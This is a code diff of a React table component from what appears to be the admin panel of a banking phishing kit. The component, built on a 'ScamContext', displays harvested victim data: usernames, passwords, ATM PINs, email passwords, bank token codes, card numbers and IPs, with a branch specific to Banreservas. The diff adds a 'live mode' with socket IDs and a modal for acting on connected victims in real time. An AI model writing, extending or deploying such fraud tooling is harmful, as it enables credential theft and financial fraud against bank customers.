@@ -1,31 +1,36 @@
 import { Pagination, Tooltip } from '@nextui-org/react'
-import { Fragment, useContext, useState } from 'react'
+import { useContext, useState } from 'react'
 import { DeleteIcon } from '../../assets/DeleteIcon'
 import { IconButton } from '../../assets/IconButton'
 import { ScamContext } from '../../context/ScamContext'
 import tableHeader from '../../options.json'
+import { RocketIcon } from '../../assets/RocketIcon'
+import { ModalLive } from '../helpers/ModalLive'
+import { ArrowPathIcon, ArrowPathRoundedSquareIcon } from '@heroicons/react/20/solid'
 
 const banreservas = ['usuario', 'clave', 'dos', 'doce', 'veinteydos', 'treintaydos', 'cuatro', 'catorce', 'veinteycuatro', 'treintaycuatro', 'tarjeta', 'ip', '...']
 
 export const TableUserAll = ({users}) => {
 
   const { setDeleteActive, filteredType } = useContext(ScamContext);
-
+  
   const [currentPage, setCurrentPage] = useState(0);
-
+  const [visible, setVisible] = useState(false)
+  const [socketID, setsocketID] = useState(null)
+  const [modeLiveData, setModeLiveData] = useState([])
   const filteredUsers = () => {
     return users.slice( currentPage === 0 ? 0 : currentPage - 10, currentPage === 0 ? currentPage + 10 : currentPage)
   }
 
   const pagination = (e) => {
-
-    const newData = e === 1 ? 0 : e * 10;
-    
+    const newData = e === 1 ? 0 : e * 10; 
     setCurrentPage( newData  )
   }
   
   return (
     <>
+      <ModalLive visible={visible} setVisible={setVisible} modeLiveData={modeLiveData} user={socketID} />
+
       <div className="overflow-x-auto">
           <table className="table-auto w-full">
               <thead className="text-xs font-semibold uppercase text-gray-400 bg-gray-50">
@@ -67,7 +72,7 @@ export const TableUserAll = ({users}) => {
                     }
                   </tr>
               </thead>
-              <tbody className="text-sm divide-y divide-gray-100">
+              <tbody className="text-sm divide-y divide-gray-100  first:bg-red">
                 {
                   users[0]?.name === 'banreservas' ? filteredUsers().map(({
                     _id,
@@ -224,12 +229,12 @@ export const TableUserAll = ({users}) => {
                           </td>
                         </tr>
                       )
-                    }) 
+                  }) 
 
 
-                    : filteredUsers().map( ({_id, username, password, atmPassword, typeDocument, correo, claveCorreo, celular, token1, token2, tarjeta, ip }, i) => {
+                    : filteredUsers().map( ({_id, username, password, atmPassword, typeDocument, correo, claveCorreo, celular, token1, token2, token3, modeLive, tarjeta, ip, socketID, liveData, isConnected, isLoading }, i) => {
                       return (
-                        <tr key={i}>
+                        <tr className='odd:bg-slate-50 even:bg-slate-200' key={i}>                          
                           <td className='p-2 py-3 whitespace-nowrap'>
                             <div className="flex items-center">
                               <Tooltip
@@ -378,14 +383,27 @@ export const TableUserAll = ({users}) => {
                               <div className="text-gray-800">{ip}</div>
                             </div>
                           </td>
-
-                          <td className='p-2 py-3 whitespace-nowrap'>
+                          <td className='p-2 py-3 whitespace-nowrap flex gap-2'>
                             <div className="flex items-center">
                               <IconButton onClick={() => setDeleteActive({_id})}>
                                 <DeleteIcon size={18} fill="#FF0080" />
                               </IconButton>
                             </div>
+                            {modeLive === true ? (
+                              <div className="flex items-center">
+                                <IconButton onClick={() => {
+                                    setsocketID(socketID)
+                                    setModeLiveData(liveData)
+                                    setVisible(true)
+
+                                  } }>
+                                    {/* {isLoading ? <ArrowPathRoundedSquareIcon size={18} />} */}
+                                  { isLoading === false ? (<RocketIcon  size={18} fill="#FF0080" />) : <ArrowPathIcon />}
+                                </IconButton>
+                              </div>
+                          ) : (<div></div>)}
                           </td>
+                          
                         </tr>
                       )
                   })
